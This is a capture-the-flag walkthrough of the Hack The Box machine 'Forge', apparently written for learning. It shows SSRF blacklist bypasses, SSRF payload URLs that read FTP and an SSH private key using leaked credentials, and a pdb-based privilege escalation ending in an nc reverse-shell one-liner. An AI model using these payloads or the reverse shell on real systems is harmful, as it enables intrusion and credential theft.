## Scanning :

- basic scanning

note : add `<ip> forge.htb` to the `/etc/hosts`

```bash
nmap -sV -A -T 4 10.10.11.111
```

output :

```bash
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)

```

- we can run all ports scan in the Background Until we enumerate the ports we have But it won't return any new .

## Enumeration :

- port 21 : is Filtered trying to access it

```bash
ftp <ip>
```

returns

```
ftp: connect: Connection timed out
```

so it seems we can't access it Publicly

- port 80 : "the web application"

![image](/assets/images/Forge/forge_1.png)

- we have some images located at `/static/images` , knowing that from page source code . so probably image we upload won't be rendered on this page

![image](/assets/images/Forge/forge_2.png)

- and we have upload an image Function with 2 options either from your machine or form url

![image](/assets/images/Forge/forge_3.png)

- testing from my machine to upload a .png file and see

![image](/assets/images/Forge/forge_4.png)

- it also accepts any extension and assign a random name to it

- testing from url :

firing up a **python http server** at my local machine then watch the request made we can see parameters sent are :

```bash
url=http%3A%2F%2F<my_ip>%3A8888%2Ftest.png&remote=1
```

and it made the request successfully :

```bash
10.10.11.111 - - [16/Jan/2022 17:31:20] "GET /test.png HTTP/1.1"
```

what about internal address ?

- trying http://127.0.0.1
  result :

```bash
URL contains a blacklisted address!
```

so it makes some filtering in case we try localhost address indicating maybe we are against **SSRF** .

trying some Bypasses and those doesn't return Blacklisted message

```
http://127.1
http://LOCALHOST
```

trying : `file:///etc/passwd `
returns :

```
Invalid protocol! Supported protocols: http, https
```

so now we know the following :

- we have ftp running internally
- we have ssrf to access local things
- accepts http and https only , ftp is not supported

### More Enumeration :

Typically in HTB , another Vhost is a common scenario so trying to get Fuzzing it with `ffuf`

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million 5000.txt -u http://forge.htb/ -H "Host: FUZZ.forge.htb" -fc 302,404
```

output:

```
admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
```

add `admin.forge.htb` to `/etc/hosts`

trying to access it :

![image](/assets/images/Forge/forge_5.png)

so putting things together we will have one conclusion to continue from :

`forge.htb` can make a valid request to `admin.forge.htb` , we can achieve that:

Back to the upload from url vulnerable Function and trying `http://admin.forge.htb`

returns the blacklist message , so `forge.htb` seems to Be blocked also.

trying : `http://admin.forge.HTB` then downloading the page and see contents :

![image](/assets/images/Forge/forge_6.png)

so we have the following directories at the `admin.forge.htb`

```
/announcements
/upload
/
```

Back to the upload from url and requesting

```
http://admin.forge.HTB/announcements
```

downloading the page to see the content we can see :

![image](/assets/images/Forge/forge_7.png)

- so we have credentials : **user:heightofsecurity123!**
- i tried to ssh with those But it can't access ssh with a public key so it seems we have to get the `id_rsa` somehow if we want to ssh into the machine.

- so depending on page `/announcements` we can use `ftp://` with the upload page in this `admin.forge.HTB` .

#### Foothold :

```
http://admin.forge.HTB/upload?u=ftp://
```

But How could we access the ftp with a user:password from web url ?

- reading [here](https://www.timeatlas.com/ftp-web-browser/)
- we can use the following syntax :

```
http://admin.forge.HTB/upload?u=ftp://user:heightofsecurity123!@127.1
```

downloading the content :

```
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Jan 17 00:17 user.txt
```

seems we are in the home directory of user **user** so let's try read the id_rsa

- using the following url and download content :

```
http://admin.forge.HTB/upload?u=ftp://user:heightofsecurity123!@127.1/.ssh/id_rsa
```

![image](/assets/images/Forge/forge_8.png)

```bash
chmod 600 id_rsa
ssh -i id_rsa user@10.10.11.111
```

### Privilege escalation :

![image](/assets/images/Forge/forge_9.png)

checking permissions :

```
-rwxr-xr-x 1 root root 1447 May 31  2021 /opt/remote-manage.py
```

reading and analyzing the script :

- first it sets a listener on a random port
- we can only access the port locally so we will get a second ssh session to interact with it .

```python
port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
```

2- asks for a password and it should = `secretadminpassword` , then waits for option from 1-4

```python3
clientsock.send(b'Enter the secret passsword: ')
if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
	clientsock.send(b'Wrong password!\n')
else:
	clientsock.send(b'Welcome admin!\n')
	while True:
		clientsock.send(b'\nWhat do you wanna do: \n')
		clientsock.send(b'[1] View processes\n')
		clientsock.send(b'[2] View free memory\n')
		clientsock.send(b'[3] View listening sockets\n')
		clientsock.send(b'[4] Quit\n')
		option = int(clientsock.recv(1024).strip())
```

3- options we have :

```python
if option == 1:
    clientsock.send(subprocess.getoutput('ps aux').encode())
elif option == 2:
    clientsock.send(subprocess.getoutput('df').encode())
elif option == 3:
    clientsock.send(subprocess.getoutput('ss -lnt').encode())
elif option == 4:
        clientsock.send(b'Bye\n')
        break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

if we raise an error it will open a `pdb debugger shell ` which we can abuse to have a reverse shell as root :

![image](/assets/images/Forge/forge_10.png)

the other ssh session to interact with the port listening :

![image](/assets/images/Forge/forge_11.png)

raised the error by typing `id ` while it expects a number and get the pdb shell we can now get a reverse shell :

```bash
(/assets/images/Forge/Pdb) import os
(/assets/images/Forge/Pdb) os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <my_ip> 9999 >/tmp/f")
```

![image](/assets/images/Forge/forge_14.png)

gain root reverse shell :

![image](/assets/images/Forge/forge_15.png)

# Pwned

### investigation :

we have at `/var/www` the following :

```
html forge admin
```

in the source code we can see :

```python
blacklist = ["forge.htb", "127.0.0.1", "10.10.10.10", "::1", "localhost",
             '0.0.0.0', '[0:0:0:0:0:0:0:0]']
```

which is not enough Filtering to mitigate SSRF , we have Bypassed that By changing any letter at `forge.htb` to Uppercase
